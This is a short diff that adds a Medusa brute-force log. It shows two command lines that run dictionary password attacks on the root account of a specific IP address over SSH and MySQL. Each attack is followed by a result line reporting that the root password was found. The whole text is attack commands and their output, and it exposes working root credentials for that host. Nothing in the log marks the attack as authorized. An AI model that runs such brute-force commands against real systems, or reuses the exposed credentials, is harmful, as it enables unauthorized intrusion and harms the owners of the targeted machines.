@@ -1,0 +1,8 @@
+# Medusa v.2.2 (2018-04-10 18:16:36)
+# medusa -h 134.96.111.202 -u root -P /root/web/uploads/dic/2018/03/pass.txt -M ssh -t 100 -O brute_log/3fd7c519-3ca8-11e8-8cd6-080027909a35 -F 
+# Medusa v.2.2 (2018-04-10 18:16:36)
+# medusa -h 134.96.111.202 -u root -P /root/web/uploads/dic/2018/03/pass.txt -M mysql -t 100 -O brute_log/3fd7c519-3ca8-11e8-8cd6-080027909a35 -F 
+ACCOUNT FOUND: [mysql] Host: 134.96.111.202 User: root Password: admin2017 [SUCCESS]
+# Medusa has finished (2018-04-10 18:16:38).
+ACCOUNT FOUND: [ssh] Host: 134.96.111.202 User: root Password: admin2017 [SUCCESS]
+# Medusa has finished (2018-04-10 18:16:47).
